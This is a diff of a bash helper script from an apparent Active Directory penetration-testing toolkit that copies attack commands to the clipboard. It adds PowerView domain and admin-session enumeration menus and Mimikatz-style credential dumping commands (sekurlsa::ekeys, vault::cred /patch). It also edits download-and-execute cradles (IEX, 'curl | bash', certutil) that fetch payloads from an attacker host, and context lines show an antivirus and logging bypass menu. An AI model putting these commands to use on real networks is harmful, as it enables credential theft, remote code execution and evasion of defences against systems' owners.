@@ -10,6 +10,11 @@ nb-ad-pwsh
 ------------
 The nb-ad-pwsh namespace contains commands for powershell/powerviwe commands to copy/paste to a windows machine.
 
+PowerView Enumeration
+---------------------
+nb-ad-pwsh-enum-domain                     PowerView domain enumeration commands
+nb-ad-pwsh-enum-userhunt                   PowerView user session hunting enumeration commands
+
 PowerShell Commands
 -------------------
 nb-ad-pwsh-psremoting                      connect via PSRemoting to a target host
@@ -31,8 +36,99 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
-nb-ad-pwsh-dump-secrets() {
+nb-ad-pwsh-enum-userhunt() {
+    clear
 
+    __warn "Load PowerView with:"
+    __ok ". .\\PowerView.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+
+    echo
+    __ask "PowerView User Hunting Commands:"
+    echo "1. Find all the local admin accounts on all the machines (Required Admin rights on non-DC machines)"
+    echo "2. Find Local Admin sessions for the current user"
+    echo "3. Find Local Admin sessions with PSRemoting for the current user"
+    echo "4. Find Domain Admin sessions for the current user"
+    echo "5. Return to previous menu"
+    echo
+    echo -n "Choose a command to copy: "
+    read choice
+
+    case $choice in
+        1) __COMMAND="Invoke-EnumerateLocalAdmin | select ComputerName, AccountName, IsDomain, IsAdmin";;
+        2) __COMMAND="Find-LocalAdminAccess";;
+        3) __COMMAND=". C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1; Find-PSRemotingLocalAdminAccess";;
+        4) __COMMAND="Find-DomainUserLocation";;
+        5) return;;
+        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-userhunt; return;;
+    esac
+
+    echo "$__COMMAND" | wl-copy
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    sleep 1
+    nb-ad-pwsh-enum-userhunt
+}
+
+nb-ad-pwsh-enum-domain() {
+    clear
+
+    __warn "Load PowerView with:"
+    __ok ". .\\PowerView.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+
+    echo
+    __ask "PowerView Domain Enumeration Commands:"
+    echo "1. Get current domain"
+    echo "2. Get Domain SID for the current domain"
+    echo "3. Get information of the Domain Controller"
+    echo "4. Return to previous menu"
+    echo
+    echo -n "Choose a command to copy: "
+    read choice
+
+    case $choice in
+        1) __COMMAND="Get-NetDomain";;
+        2) __COMMAND="Get-DomainSID";;
+        3) __COMMAND="Get-NetDomainController";;
+        4) return;;
+        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-domain; return;;
+    esac
+
+    echo "$__COMMAND" | wl-copy
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    sleep 1
+    nb-ad-pwsh-enum-domain
+}
+
+nb-ad-pwsh-dump-secrets() {
+    clear
+
+    __warn "Load Invoke-Mimi with:"
+    __ok ". .\\Invoke-Mimi.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+
+    echo
+    __ask "Choose a command to copy:"
+    echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
+    echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
+    echo
+    echo -n "Choice: "
+    read choice
+
+    case $choice in
+        1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
+        2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
+        3) exit;;
+        *) echo "Invalid option"; exit;;
+    esac
+
+    echo "$__COMMAND" | wl-copy
+    __info "Command copied to clipboard"
+    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-file-download() {
@@ -46,7 +142,7 @@ nb-ad-pwsh-file-download() {
     case $down in
         d)
             # Commands for downloading to disk
-            echo "Choose a command to copy:"
+            __ask "Choose a command to copy:"
             echo "1. iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename"
             echo "2. certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
             echo "3. wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
@@ -67,7 +163,7 @@ nb-ad-pwsh-file-download() {
             ;;
         e)
             # Commands for downloading and executing in memory
-            echo "Choose a command to copy:"
+            __ask "Choose a command to copy:"
             echo "1. IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
             echo "2. IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')"
             echo "3. curl http://${__LHOST}:${__LPORT}/$filename | bash"
@@ -77,9 +173,9 @@ nb-ad-pwsh-file-download() {
             read choice
 
             case $choice in
-                1) __COMMAND="powershell -c IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+                1) __COMMAND="IEX(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
                 2) __COMMAND="curl http://${__LHOST}:${__LPORT}/$filename | bash";;
-                3) __COMMAND="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
+                3) __COMMAND="IEX(New-Object Net.WebClient).DownloadString('http://${__LHOST}:${__LPORT}/$filename')";;
                 4) exit;;
                 *) echo "Invalid option"; exit;;
             esac
@@ -168,7 +264,6 @@ nb-ad-pwsh-ping() {
 nb-ad-pwsh-av-bypass() {
     # Display menu
     __ask "Choose a command to copy:"
-    echo "Please select a command to copy to clipboard:"
     echo "1) Bypass the execution policy"
     echo "2) Disable AV using powershell (Requires Local Admin rights)"
     echo "3) Bypass enhanced script block logging so that AMSI bypass is not logged"
